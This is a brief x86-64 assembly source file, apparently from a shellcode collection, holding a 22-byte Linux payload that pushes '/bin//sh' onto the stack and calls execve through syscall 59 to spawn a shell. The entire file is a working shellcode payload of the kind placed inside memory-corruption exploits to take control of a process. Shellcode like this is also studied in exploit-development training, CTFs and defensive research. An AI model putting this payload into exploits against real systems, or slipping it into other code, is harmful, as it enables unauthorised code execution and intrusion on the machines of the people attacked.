

; 22 byte execve("/bin//sh", 0, 0) for linux/x64
; odzhan

    bits 64
    
start64:
	push    59
	pop     rax
	cdq
	push    rdx
	pop     rsi
    mov     rcx, 0x68732f2f6e69622f
    push    rdx              ; 0
    push    rcx              ; "/bin//sh"
    push    rsp
    pop     rdi              ; rdi="/bin//sh",0
    syscall
    
